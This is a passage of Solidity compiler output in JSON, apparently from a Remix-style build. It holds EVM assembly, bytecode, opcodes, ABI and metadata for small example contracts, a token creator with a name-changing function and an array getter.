													"source": 4
												},
												{
													"begin": 4708,
													"end": 4713,
													"name": "PUSH",
													"source": 4,
													"value": "1"
												},
												{
													"begin": 4708,
													"end": 4713,
													"name": "PUSH",
													"source": 4,
													"value": "0"
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "PUSH",
													"source": 4,
													"value": "100"
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "EXP",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "SLOAD",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "PUSH",
													"source": 4,
													"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "MUL",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "NOT",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "AND",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "DUP4",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "PUSH",
													"source": 4,
													"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "AND",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "MUL",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "OR",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "SSTORE",
													"source": 4
												},
												{
													"begin": 4708,
													"end": 4726,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 5141,
													"end": 5151,
													"name": "CALLER",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5125,
													"name": "PUSH",
													"source": 4,
													"value": "0"
												},
												{
													"begin": 5118,
													"end": 5125,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "PUSH",
													"source": 4,
													"value": "100"
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "EXP",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "SLOAD",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "PUSH",
													"source": 4,
													"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "MUL",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "NOT",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "AND",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "DUP4",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "PUSH",
													"source": 4,
													"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "AND",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "MUL",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "OR",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "SSTORE",
													"source": 4
												},
												{
													"begin": 5118,
													"end": 5152,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 5170,
													"end": 5175,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 5163,
													"end": 5167,
													"name": "PUSH",
													"source": 4,
													"value": "2"
												},
												{
													"begin": 5163,
													"end": 5175,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 5163,
													"end": 5175,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 5163,
													"end": 5175,
													"name": "SSTORE",
													"source": 4
												},
												{
													"begin": 5163,
													"end": 5175,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 4481,
													"end": 5183,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "PUSH #[$]",
													"source": 4,
													"value": "0000000000000000000000000000000000000000000000000000000000000000"
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "PUSH [$]",
													"source": 4,
													"value": "0000000000000000000000000000000000000000000000000000000000000000"
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "PUSH",
													"source": 4,
													"value": "0"
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "CODECOPY",
													"source": 4
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "PUSH",
													"source": 4,
													"value": "0"
												},
												{
													"begin": 3889,
													"end": 6975,
													"name": "RETURN",
													"source": 4
												}
											],
											".data": {
												"0": {
													".auxdata": "a2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033",
													".code": [
														{
															"begin": 3889,
															"end": 6975,
															"name": "PUSH",
															"source": 4,
															"value": "80"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "PUSH",
															"source": 4,
															"value": "40"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "MSTORE",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "CALLVALUE",
															"source": 4
														},
														{
															"begin": 5,
															"end": 14,
															"name": "DUP1",
															"source": -1
														},
														{
															"begin": 2,
															"end": 4,
															"name": "ISZERO",
															"source": -1
														},
														{
															"begin": 2,
															"end": 4,
															"name": "PUSH [tag]",
															"source": -1,
															"value": "1"
														},
														{
															"begin": 2,
															"end": 4,
															"name": "JUMPI",
															"source": -1
														},
														{
															"begin": 27,
															"end": 28,
															"name": "PUSH",
															"source": -1,
															"value": "0"
														},
														{
															"begin": 24,
															"end": 25,
															"name": "DUP1",
															"source": -1
														},
														{
															"begin": 17,
															"end": 29,
															"name": "REVERT",
															"source": -1
														},
														{
															"begin": 2,
															"end": 4,
															"name": "tag",
															"source": -1,
															"value": "1"
														},
														{
															"begin": 2,
															"end": 4,
															"name": "JUMPDEST",
															"source": -1
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "POP",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "PUSH",
															"source": 4,
															"value": "4"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "CALLDATASIZE",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "LT",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "PUSH [tag]",
															"source": 4,
															"value": "2"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "JUMPI",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "PUSH",
															"source": 4,
															"value": "0"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "CALLDATALOAD",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "PUSH",
															"source": 4,
															"value": "E0"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "SHR",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "DUP1",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "PUSH",
															"source": 4,
															"value": "898855ED"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "EQ",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "PUSH [tag]",
															"source": 4,
															"value": "3"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "JUMPI",
															"source": 4
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "tag",
															"source": 4,
															"value": "2"
														},
														{
															"begin": 3889,
															"end": 6975,
															"name": "JUMPDEST",
															"source": 4
														},
														{
															"begin": 12,
															"end": 13,
															"name": "PUSH",
															"source": -1,
															"value": "0"
														},
														{
															"begin": 9,
															"end": 10,
															"name": "DUP1",
															"source": -1
														},
														{
															"begin": 2,
															"end": 14,
															"name": "REVERT",
															"source": -1
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "tag",
															"source": 4,
															"value": "3"
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "JUMPDEST",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "PUSH [tag]",
															"source": 4,
															"value": "4"
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "PUSH",
															"source": 4,
															"value": "4"
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "DUP1",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "CALLDATASIZE",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "SUB",
															"source": 4
														},
														{
															"begin": 15,
															"end": 17,
															"name": "PUSH",
															"source": -1,
															"value": "20"
														},
														{
															"begin": 10,
															"end": 13,
															"name": "DUP2",
															"source": -1
														},
														{
															"begin": 7,
															"end": 18,
															"name": "LT",
															"source": -1
														},
														{
															"begin": 4,
															"end": 6,
															"name": "ISZERO",
															"source": -1
														},
														{
															"begin": 4,
															"end": 6,
															"name": "PUSH [tag]",
															"source": -1,
															"value": "5"
														},
														{
															"begin": 4,
															"end": 6,
															"name": "JUMPI",
															"source": -1
														},
														{
															"begin": 31,
															"end": 32,
															"name": "PUSH",
															"source": -1,
															"value": "0"
														},
														{
															"begin": 28,
															"end": 29,
															"name": "DUP1",
															"source": -1
														},
														{
															"begin": 21,
															"end": 33,
															"name": "REVERT",
															"source": -1
														},
														{
															"begin": 4,
															"end": 6,
															"name": "tag",
															"source": -1,
															"value": "5"
														},
														{
															"begin": 4,
															"end": 6,
															"name": "JUMPDEST",
															"source": -1
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "DUP2",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "ADD",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "SWAP1",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "DUP1",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "DUP1",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "CALLDATALOAD",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "SWAP1",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "PUSH",
															"source": 4,
															"value": "20"
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "ADD",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "SWAP1",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "SWAP3",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "SWAP2",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "SWAP1",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "POP",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "POP",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "POP",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "PUSH [tag]",
															"source": 4,
															"value": "6"
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "JUMP",
															"source": 4,
															"value": "[in]"
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "tag",
															"source": 4,
															"value": "4"
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "JUMPDEST",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "STOP",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "tag",
															"source": 4,
															"value": "6"
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "JUMPDEST",
															"source": 4
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "PUSH",
															"source": 4,
															"value": "0"
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "DUP1",
															"source": 4
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "SWAP1",
															"source": 4
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "SLOAD",
															"source": 4
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "SWAP1",
															"source": 4
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "PUSH",
															"source": 4,
															"value": "100"
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "EXP",
															"source": 4
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "SWAP1",
															"source": 4
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "DIV",
															"source": 4
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "PUSH",
															"source": 4,
															"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
														},
														{
															"begin": 6045,
															"end": 6052,
															"name": "AND",
															"source": 4
														},
														{
															"begin": 6023,
															"end": 6053,
															"name": "PUSH",
															"source": 4,
															"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
														},
														{
															"begin": 6023,
															"end": 6053,
															"name": "AND",
															"source": 4
														},
														{
															"begin": 6023,
															"end": 6033,
															"name": "CALLER",
															"source": 4
														},
														{
															"begin": 6023,
															"end": 6053,
															"name": "PUSH",
															"source": 4,
															"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
														},
														{
															"begin": 6023,
															"end": 6053,
															"name": "AND",
															"source": 4
														},
														{
															"begin": 6023,
															"end": 6053,
															"name": "EQ",
															"source": 4
														},
														{
															"begin": 6019,
															"end": 6082,
															"name": "ISZERO",
															"source": 4
														},
														{
															"begin": 6019,
															"end": 6082,
															"name": "PUSH [tag]",
															"source": 4,
															"value": "8"
														},
														{
															"begin": 6019,
															"end": 6082,
															"name": "JUMPI",
															"source": 4
														},
														{
															"begin": 6075,
															"end": 6082,
															"name": "DUP1",
															"source": 4
														},
														{
															"begin": 6068,
															"end": 6072,
															"name": "PUSH",
															"source": 4,
															"value": "2"
														},
														{
															"begin": 6068,
															"end": 6082,
															"name": "DUP2",
															"source": 4
														},
														{
															"begin": 6068,
															"end": 6082,
															"name": "SWAP1",
															"source": 4
														},
														{
															"begin": 6068,
															"end": 6082,
															"name": "SSTORE",
															"source": 4
														},
														{
															"begin": 6068,
															"end": 6082,
															"name": "POP",
															"source": 4
														},
														{
															"begin": 6019,
															"end": 6082,
															"name": "tag",
															"source": 4,
															"value": "8"
														},
														{
															"begin": 6019,
															"end": 6082,
															"name": "JUMPDEST",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "POP",
															"source": 4
														},
														{
															"begin": 5191,
															"end": 6090,
															"name": "JUMP",
															"source": 4,
															"value": "[out]"
														}
													]
												}
											}
										}
									}
								}
							}
						},
						"methodIdentifiers": {
							"changeName(address,bytes32)": "7379b422",
							"createToken(bytes32)": "ae3edb65"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract OwnedToken\",\"name\":\"tokenAddress\",\"type\":\"address\"},{\"internalType\":\"bytes32\",\"name\":\"name\",\"type\":\"bytes32\"}],\"name\":\"changeName\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"name\",\"type\":\"bytes32\"}],\"name\":\"createToken\",\"outputs\":[{\"internalType\":\"contract OwnedToken\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":\"TokenCreator\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				},
				"arrayExample": {
					"abi": [
						{
							"inputs": [],
							"name": "getArray",
							"outputs": [
								{
									"internalType": "uint256[]",
									"name": "",
									"type": "uint256[]"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "myArray",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9000:10083  contract arrayExample {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9000:10083  contract arrayExample {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9000:10083  contract arrayExample {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9000:10083  contract arrayExample {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xcc3e57d9\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd504ea1d\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9055:9076  uint[] public myArray */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_6\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_6:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9055:9076  uint[] public myArray */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9995:10080  function getArray() public view returns (uint[] memory) {\r... */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      0x20\n      mul\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_10:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_10)\n    tag_12:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9995:10080  function getArray() public view returns (uint[] memory) {\r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9055:9076  uint[] public myArray */\n    tag_7:\n      0x00\n      dup2\n      dup2\n      sload\n      dup2\n      lt\n      tag_13\n      jumpi\n      invalid\n    tag_13:\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9995:10080  function getArray() public view returns (uint[] memory) {\r... */\n    tag_9:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":10036:10049  uint[] memory */\n      0x60\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":10067:10074  myArray */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":10060:10074  return myArray */\n      dup1\n      sload\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x20\n      mul\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_17:\n      dup2\n      sload\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      0x01\n      add\n      swap1\n      dup1\n      dup4\n      gt\n      tag_17\n      jumpi\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":9995:10080  function getArray() public view returns (uint[] memory) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220ec8d2933d326cd1b17d6c4784aa8e387ffa1617f1cdc04320364b3b97698a2ec64736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5061018b806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063cc3e57d91461003b578063d504ea1d1461007d575b600080fd5b6100676004803603602081101561005157600080fd5b81019080803590602001909291905050506100dc565b6040518082815260200191505060405180910390f35b6100856100fd565b6040518080602001828103825283818151815260200191508051906020019060200280838360005b838110156100c85780820151818401526020810190506100ad565b505050509050019250505060405180910390f35b600081815481106100e957fe5b906000526020600020016000915090505481565b6060600080548060200260200160405190810160405280929190818152602001828054801561014b57602002820191906000526020600020905b815481526020019060010190808311610137575b505050505090509056fea2646970667358221220ec8d2933d326cd1b17d6c4784aa8e387ffa1617f1cdc04320364b3b97698a2ec64736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18B DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCC3E57D9 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xD504EA1D EQ PUSH2 0x7D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x67 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xDC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x85 PUSH2 0xFD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH1 0x20 MUL DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xC8 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xAD JUMP JUMPDEST POP POP POP POP SWAP1 POP ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0xE9 JUMPI INVALID JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD DUP1 ISZERO PUSH2 0x14B JUMPI PUSH1 0x20 MUL DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP1 PUSH1 0x1 ADD 